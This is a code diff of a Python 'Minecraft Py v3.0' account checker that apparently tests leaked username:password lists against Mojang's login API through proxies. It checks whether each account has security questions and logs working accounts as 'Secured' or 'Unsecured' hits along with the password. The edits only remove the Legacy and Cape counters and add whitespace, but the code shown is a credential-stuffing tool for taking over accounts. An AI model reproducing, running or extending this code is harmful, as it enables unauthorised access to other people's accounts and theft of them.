@@ -48,7 +48,7 @@ cpm_counter = cpm(int(time.time()))
 #Title bar
 def updateTitle():
     meow = int(cpm_counter.cpm())
-    ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v3.0 | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Legacy: {status.Legacy} Cape: {status.Cape} Free: {status.Free}")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v3.0 | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Free: {status.Free}")
     pass
 
 
@@ -89,6 +89,7 @@ def login(q,proxies,log,proxy_type):
                 except:
                     status.errors += 1
                     return False
+
                 try:
                     data = rsp.json()
                 except:
@@ -112,6 +113,7 @@ def login(q,proxies,log,proxy_type):
 
                 token = data['accessToken']
                 mcusername = data['selectedProfile']['name']
+
                 url2 = "https://api.mojang.com/user/security/challenges"
                 headers2 = {"Authorization":f"Bearer {token}"}
 
@@ -128,6 +130,7 @@ def login(q,proxies,log,proxy_type):
                     status.errors += 1
                     return False
 
+
                 if 'answer' in rsp2.text:
                     print(colors.green + f" [Secured]: {username}:{password} | Username: {mcusername}")
                     results.Secured(f"{username}:{password} | Username: {mcusername} | Secured")
@@ -139,6 +142,7 @@ def login(q,proxies,log,proxy_type):
                     status.Hits += 1
                     updateTitle()
                     return True
+
                 elif 'answer' not in rsp2.text:
                     security = 'Unsecured'
                     print(colors.cyan + f" [Unsecured]: {username}:{password} | Username: {mcusername}")
@@ -153,6 +157,7 @@ def login(q,proxies,log,proxy_type):
                     return True
                 else:
                     pass
+
 
             #Errors
             proxy = None
@@ -198,8 +203,6 @@ if __name__ == "__main__":
     Hits: {status.Hits}
     Secured: {status.Secured}
     Unsecured: {status.Unsecured}
-    Legacy: {status.Legacy}
-    Capes: {status.Cape}
     Free: {status.Free}
     """)
 
